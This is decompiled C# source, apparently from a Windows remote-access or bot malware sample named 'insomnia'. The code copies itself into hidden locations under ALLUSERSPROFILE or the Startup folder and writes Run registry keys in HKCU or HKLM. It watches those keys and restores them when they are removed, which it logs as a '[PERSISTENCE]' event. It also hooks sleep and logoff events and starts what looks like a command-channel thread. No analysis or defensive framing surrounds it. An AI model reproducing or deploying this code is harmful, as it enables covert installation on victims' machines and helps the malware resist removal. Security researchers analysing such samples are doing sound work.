using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.Win32;

namespace insomnia;

internal class Class13
{
	public static Thread Field9 = new Thread((ThreadStart)delegate
	{
		Class31.Method7(Class26.Field10, Class26.Field8, Class26.Field7, Class26.Field6, Class26.Field11);
	});

	public static Class34 Field8;

	public static Mutex Field7;

	public static bool Field6 = false;

	public static string Field5 = "HKCU";

	public static string Field4 = Environment.GetEnvironmentVariable("ALLUSERSPROFILE");

	public static string Field3 = Field4 + "\\" + Class26.Field21;

	public static string Field2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class26.Field21;

	[CompilerGenerated]
	private static ThreadStart Field1;

	private static void Method5(string[] args)
	{
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_028a: Expected O, but got Unknown
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Expected O, but got Unknown
		try
		{
			Field7 = Mutex.OpenExisting(Class26.Field13);
			Environment.Exit(0);
		}
		catch
		{
			Field7 = new Mutex(initiallyOwned: true, Class26.Field13);
		}
		int num;
		try
		{
			num = 0;
			if (num >= args.Length)
			{
				Class14.Method1();
				goto IL_005d;
			}
			string text = args[num];
			if (text == "u")
			{
				Field6 = true;
			}
		}
		catch
		{
			goto IL_005d;
		}
		num++;
		/*Error near IL_005b: Could not find block for branch target IL_002e*/;
		IL_005d:
		try
		{
			if (!Class26.Field20.Contains(Class26.Field21))
			{
				try
				{
					File.Copy(Class26.Field20, Field3);
					if (Field6)
					{
						Process process = new Process();
						process.StartInfo.FileName = Field3;
						process.StartInfo.Arguments = "u";
						process.Start();
						process.Dispose();
					}
					else
					{
						Process.Start(Field3);
					}
				}
				catch
				{
					File.Copy(Class26.Field20, Field2);
					if (Field6)
					{
						Process process2 = new Process();
						process2.StartInfo.FileName = Field2;
						process2.StartInfo.Arguments = "u";
						process2.Start();
						process2.Dispose();
					}
					else
					{
						Process.Start(Field2);
					}
				}
				Environment.Exit(0);
			}
			if (File.GetAttributes(Class26.Field20) != FileAttributes.Hidden)
			{
				File.SetAttributes(Class26.Field20, FileAttributes.Hidden);
			}
		}
		catch
		{
		}
		try
		{
			if (Class39.Method20() == "u")
			{
				try
				{
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class26.Field5, Class26.Field20);
					Field8 = new Class34(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					if (Class39.Method18() == "32")
					{
						Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class26.Field5, Class26.Field20);
						Field8 = new Class34(RegistryHive.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					}
					else
					{
						Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class26.Field5, Class26.Field20);
						Field8 = new Class34(RegistryHive.LocalMachine, "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run");
					}
					Field5 = "HKLM";
				}
				catch
				{
					Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class26.Field5, Class26.Field20);
					Field8 = new Class34(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
				}
			}
			Field8.Event_0 += Method2;
			Field8.Method4();
		}
		catch
		{
		}
		try
		{
			SystemEvents.add_PowerModeChanged(new PowerModeChangedEventHandler(Method4));
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(Method3));
		}
		catch
		{
		}
		try
		{
			Field9.Start();
			Thread thread = new Thread(Class17.Method4);
			thread.IsBackground = true;
			thread.Start();
		}
		catch
		{
		}
	}

	private static void Method4(object sender, PowerModeChangedEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected I4, but got Unknown
		try
		{
			PowerModes mode = e.get_Mode();
			switch (mode - 1)
			{
			case 0:
				Field9.Start();
				break;
			case 2:
				Class39.Method1("Windows is going to sleep...");
				break;
			case 1:
				break;
			}
		}
		catch
		{
		}
	}

	private static void Method3(object sender, SessionEndingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected I4, but got Unknown
		try
		{
			SessionEndReasons reason = e.get_Reason();
			switch (reason - 1)
			{
			case 0:
				Class39.Method1("Windows is logging off...");
				break;
			case 1:
				Class39.Method1("Windows is shutting down...");
				break;
			}
		}
		catch
		{
		}
	}

	private static void Method2(object sender, EventArgs e)
	{
		RegistryKey registryKey = null;
		registryKey = ((!(Field5 == "HKLM")) ? Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") : Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
		if (registryKey.GetValue(Class26.Field5) != null && !(registryKey.GetValue(Class26.Field5)!.ToString() != Class26.Field20))
		{
			return;
		}
		try
		{
			if (Field5 == "HKLM")
			{
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class26.Field5, Class26.Field20);
			}
			else
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class26.Field5, Class26.Field20);
			}
			if (Class26.Field15)
			{
				Class31.Method3("[PERSISTENCE]: Registry key was replaced (" + Field5 + "\\" + Class26.Field5 + " -> " + Class26.Field20 + ").", Class26.Field8);
			}
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	private static void Method1()
	{
		Class31.Method7(Class26.Field10, Class26.Field8, Class26.Field7, Class26.Field6, Class26.Field11);
	}
}
